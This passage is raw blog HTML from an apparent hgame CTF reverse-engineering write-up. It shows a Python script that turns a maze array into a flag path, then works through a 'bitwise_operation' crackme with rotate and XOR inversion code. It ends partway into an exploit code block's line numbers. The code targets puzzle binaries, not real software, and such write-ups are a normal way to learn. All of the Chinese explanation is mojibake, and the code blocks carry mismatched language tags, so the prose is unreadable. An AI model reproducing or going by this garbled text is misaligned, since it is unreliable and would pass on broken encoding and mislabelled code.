class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">usefulmaze=''</span><br><span class="line"><span class="symbol">for i in range(len(maze)):</span></span><br><span class="line"><span class="symbol">    if i%64==0:</span></span><br><span class="line">        usefulmaze+=<span class="string">"\n"</span></span><br><span class="line"><span class="symbol">    if i%4==0:</span></span><br><span class="line">        usefulmaze+=str(maze[i])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">print usefulmaze</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><p><img src="https://i.loli.net/2020/04/30/p7XQ8zSv2gnRmkN.png" alt="img"></p><p>æ‰€ä»¥flagï¼šhgame{ssssddddddsssssddwwdddssssdssdd}</p><h3 id="bitwise-operation"><a href="#bitwise-operation" class="headerlink" title="bitwise_operation"></a>bitwise_operation</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-18"><a href="#é¢˜ç›®ä»‹ç»ï¼š-18" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> è¿˜è®°å¾—ç¬¬ä¸‰æ¬¡Cè¯­è¨€åŸ¹è®­çš„ä½œä¸šâ€œä½è¿ç®—â€å—ï¼Ÿè¿™æ˜¯2.0<br>å­¦ä¹ èµ„æ–™ï¼š<a href="http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png" target="_blank" rel="noopener">http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png</a> </p><h4 id="è§£é¢˜æ€è·¯ï¼š-18"><a href="#è§£é¢˜æ€è·¯ï¼š-18" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä¹Ÿæ˜¯ä¸€ä¸ªé™æ€åˆ†æçš„é¢˜</p><p>æ ¸å¿ƒä»£ç ï¼š</p><p><img src="https://i.loli.net/2020/04/30/CurdNw6vIlkLzQf.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œv8ï¼Œv11,v13ï¼Œæ˜¯è´Ÿæ•°ï¼Œç„¶ååˆ¤æ–­é‚£è¾¹ä¹Ÿæœ‰ä¸€äº›ç‰¹å®šæ˜¯æ•°å­—ï¼Œ</p><p>å…¶å®é€šè¿‡å‰é¢çš„å˜é‡çš„å®šä¹‰</p><p>è¿™äº›éƒ½æ˜¯å­—ç¬¦å‹ï¼Œæ‰€ä»¥å…¶å®æ˜¯å¯ä»¥ç”¨Ré”®æ¥è½¬æ¢çš„</p><p>å¦‚æœæœ‰ä¸å¯è§å­—ç¬¦ï¼Œä¸æ–¹ä¾¿çœ‹ï¼Œé‚£å°±ç”¨Hé”®å˜æˆintå‹ï¼Œ</p><p>è¿™äº›é”®ä½çš„æ„æ€ï¼Œå³é”®å°±å¯ä»¥çœ‹åˆ°äº†</p><p>è½¬å˜ä¹‹åå°±å˜æˆäº†è¿™æ ·</p><p><img src="https://i.loli.net/2020/04/30/yIFgl2DxJrOGWnR.png" alt="img"></p><p>è¿™æ ·ä¼šæ–¹ä¾¿çš„å¤š</p><p>æˆ‘ä»¬å…ˆçœ‹åˆ°å…¶ä¸­å¾—å‡½æ•°sub_400616ï¼ˆï¼‰</p><p>è¯»ä¸‹æ¥å…¶å®ä¸éš¾æ˜ç™½ï¼Œå…¶å®å°±æ˜¯å®ç°äº†ä¸€ä¸ªatollçš„åŠŸèƒ½ï¼Œ</p><p>å°±æ˜¯å°†å­—ç¬¦ä¸²æ¯ä¸¤ä½å–ä¸‹æ¥ï¼Œä½œä¸ºä¸€ä¸ªæ•´å‹ï¼Œä¸¾ä¸ªæ —å­ï¼Œå°±æ˜¯ â€˜abcdefâ€™ï¼Œè½¬åŒ–ä¸ºä¸‰ä¸ªæ•°å­—ï¼Œ0xab,0xcd,0xef</p><p>å…¶ä¸­ï¼Œv14æ˜¯æˆ‘ä»¬è¾“å…¥ï¼ˆé™¤å»hgame{}ï¼‰çš„å‰16ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ä¼šè½¬æˆ8ä¸ªæ•°å­—</p><p>v16æ˜¯æˆ‘ä»¬è¾“å…¥ï¼ˆé™¤å»hgame{}ï¼‰çš„å16ä¸ªå­—ç¬¦ï¼Œä¹Ÿæ˜¯ä¼šè½¬æˆ8ä¸ªæ•°å­—</p><p>ç„¶åæˆ‘ä»¬çœ‹åˆ°ä¸­é—´ä¸€å¤§å—çš„åŠ å¯†ä»£ç ä¸­é—´æ¶‰åŠçš„ä½æ“ä½œï¼Œæ‰€ä»¥è¿™è¾¹å»ºè®®å¯ä»¥æŠŠè¿™äº›åå…­è¿›åˆ¶è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ¥çœ‹</p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸ï¼ˆ&amp;ï¼‰ä¸Š0xE0ï¼Œå°±æ˜¯å–å‰ä¸‰ä½çš„æ„æ€ï¼Œ</p><p>è€Œ*8 è¿™ä¸ªæ“ä½œç›¸å½“äºï¼Œ*2^3^,åœ¨äºŒè¿›åˆ¶ä¸‹ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºå·¦ç§»3ä½ï¼Œç„¶ååˆæˆ–ï¼ˆ|ï¼‰ä¸Šä¹‹å‰å–å¾—ä¸‰ä½æ•°ï¼Œä¹Ÿå°±æ˜¯æŠŠä¹‹å‰å¾—ä¸‰ä½åŠ åœ¨è¿™ä¸ªå·¦ç§»äº†ä¸‰ä½å¾—æ•°ä¸Šï¼Œåˆå› ä¸ºè¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªcharå‹ï¼Œåªæœ‰1ä¸ªå­—èŠ‚ï¼Œæ‰€æœ‰é«˜ä½æŠ¹æ‰ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªåŠ å¯†ç¬¬ä¸€è¡Œå¾—æ“ä½œå°±æ˜¯å°†ä¸€ä¸ªå­—èŠ‚å¾—å€¼å¾ªç¯å·¦ç§»äº†ä¸‰ä½ã€‚ </p><p>ä¸¾ä¸ªæ —å­ï¼š 0b<strong>101</strong>00011 -&gt; 0b 00011<strong>101</strong></p><p>æˆ‘ä»¬å†çœ‹åˆ°ï¼Œä¸ï¼ˆ&amp;ï¼‰ä¸Š0x55å’Œä¸ï¼ˆ&amp;ï¼‰ä¸Š0xAAåˆ†åˆ«æ˜¯å–è¿™ä¸ªæ•°å¾—å¥‡æ•°ä½å’Œå¶æ•°ä½ï¼Œè‹¥ä¹‹åå†æˆ–ï¼ˆ|ï¼‰ä¸Šï¼Œå…¶å®ç›¸å½“äºå•¥ä¹Ÿæ²¡å˜ï¼Œ</p><p>è€Œä¹˜ä»¥2ï¼Œä¹Ÿå°±ç›¸å½“äºå·¦ç§»äº†ä¸€ä½ï¼Œ</p><p>æœ€åæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªåŠ å¯†ç®€åŒ–æˆè¿™æ ·ï¼š</p><p><img src="https://i.loli.net/2020/05/01/RuX5jicKq8IfBnA.png" alt="image-20200121164628877"></p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸‹é¢çš„åˆ¤æ–­</p><p>å…¶ä¸­v14æ˜¯åŠ å¯†è¿‡åçš„å€¼ï¼Œå†ä¸v6ï¼ˆæˆ‘ä»¬å§‘ä¸”æŠŠè¿™ä¸ªv6å½“ä½œä¸€ä¸ªkeyï¼Œå€¼å°±æ˜¯ä¸Šé¢æ‰€ç»™çš„8ä¸ªæ•°å­—ï¼‰é€ä½å¼‚æˆ–åï¼Œä¸byte_602060åˆ¤æ–­ã€‚å…¶ä¸­byte_602060å°±æ˜¯<img src="https://i.loli.net/2020/05/01/YLHT8BOAqpGmyfw.png" alt="img"></p><p>ä¸Šé¢çš„8ä¸ªå­—ç¬¦ï¼Œä¸‹é¢çš„8ä¸ªå­—ç¬¦ç•™ç€åˆ¤æ–­ä¸‹ä¸€æ®µ</p><p>ç„¶åv16å†ä¸v14å’Œkeyé€ä½å¼‚æˆ–ï¼Œå¾—åˆ°å€¼ä¸ä¸Šå›¾ä¸‹é¢çš„8ä¸ªå­—ç¬¦åˆ¤æ–­ã€‚<strong>æ³¨æ„ï¼Œ</strong>æ­¤æ—¶çš„v14å·²ç»æ˜¯ä¸keyå¼‚æˆ–è¿‡åçš„å€¼äº†ï¼Œå†æ¬¡å¼‚æˆ–keyï¼Œä¸¤æ¬¡å¼‚æˆ–ç›¸å½“äºæ²¡æœ‰å¼‚æˆ–ï¼Œæ‰€ä»¥å¯ä»¥çœ‹æˆv16ç›´æ¥ä¸åŸæ¥åŠ å¯†è¿‡åçš„v14å¼‚æˆ–ã€‚</p><p>æ­£å‘åŠ å¯†æˆ‘ä»¬äº†è§£äº†åï¼Œæˆ‘ä»¬å¯ä»¥é€†å‘è§£å¯†äº†ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ä¸¤æ®µå­—ç¬¦ï¼Œåˆ†åˆ«æ˜¯ä¸²1ï¼še4sy_Re_å’Œä¸²2ï¼šEasylif3ï¼Œ</p><p>step1ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬æŠŠä¸²1å’Œkeyå¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°v14ï¼Œç„¶åæˆ‘ä»¬å°†ä¸²2å’Œv14å¼‚æˆ–å¯ä»¥å¾—åˆ°v16 ï¼ˆæˆ–è€…ä¹Ÿå¯ä»¥ä¸²1å’Œä¸²2å’Œkeyå¼‚æˆ–ï¼Œå¾—åˆ°v16ï¼‰</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FLAG</span>=[]</span><br><span class="line">res14=[]</span><br><span class="line">res16=[]</span><br><span class="line">key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line"><span class="built_in">flag</span>=<span class="string">'e4sy_Re_Easylif3'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">0</span>,len(<span class="built_in">flag</span>),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">FLAG</span>.<span class="built_in">append</span>(<span class="built_in">flag</span>[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">    res14.<span class="built_in">append</span>(int(key[i])^int(<span class="built_in">FLAG</span>[i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">    res16.<span class="built_in">append</span>(int(<span class="built_in">FLAG</span>[i+<span class="number">8</span>],<span class="number">16</span>)^int(res14[i]))</span><br></pre></td></tr></table></figure><p>step2:</p><p><img src="https://i.loli.net/2020/05/01/qpNTojy5nALmaks.png" alt="img"></p><p>æ­¤æ—¶æˆ‘ä»¬å·²ç»çŸ¥é“å¼å­å·¦è¾¹çš„a1[i]ï¼Œå¼å­å³è¾¹çš„a1[i]ï¼Œåªéœ€è¦å¼å­å·¦å³è¾¹çš„a1[i] ä¸ ((a2[7-i] &amp; 0xaa) &gt;&gt; 1 )  å¼‚æˆ–ä¸€éå³å¯</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)<span class="symbol">:</span></span><br><span class="line">    a1.append(res14[i] ^ ((res16[<span class="number">7</span>-i] &amp; <span class="number">170</span>) <span class="meta">&gt;&gt; </span><span class="number">1</span> ))</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„æ“ä½œåŒç†ï¼Œ</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    a2.append(res16[<span class="number">7</span>-<span class="built_in">i</span>] ^ ((a1[<span class="built_in">i</span>] &amp; <span class="number">85</span>) &lt;&lt; <span class="number">1</span> )<span class="comment">%256)</span></span><br><span class="line"></span><br><span class="line">a2.reverse()</span><br><span class="line"></span><br><span class="line">a1_1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    a1_1.append(a1[<span class="built_in">i</span>] ^ ((a2[<span class="number">7</span>-<span class="built_in">i</span>] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br></pre></td></tr></table></figure><p>æœ€åä¹‹å‰æ˜¯å¾ªç¯å·¦ç§»çš„ï¼Œæˆ‘ä»¬å¾ªç¯å³ç§»å°±å¯</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a_final=[]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">ans</span>=bin(a1_1[<span class="built_in">i</span>])[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">    a_final.append(int(<span class="built_in">ans</span>[<span class="number">5</span>:<span class="number">8</span>]+<span class="built_in">ans</span>[<span class="number">0</span>:<span class="number">5</span>],<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>æœ€åå°±å¯ä»¥å¾—åˆ°flagäº†</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>=<span class="string">"hgame&#123;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> a_final:</span><br><span class="line">    <span class="built_in">flag</span>+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> a2:</span><br><span class="line">    <span class="built_in">flag</span>+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span>+=<span class="string">"&#125;"</span></span><br><span class="line">print <span class="built_in">flag</span></span><br></pre></td></tr></table></figure><h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 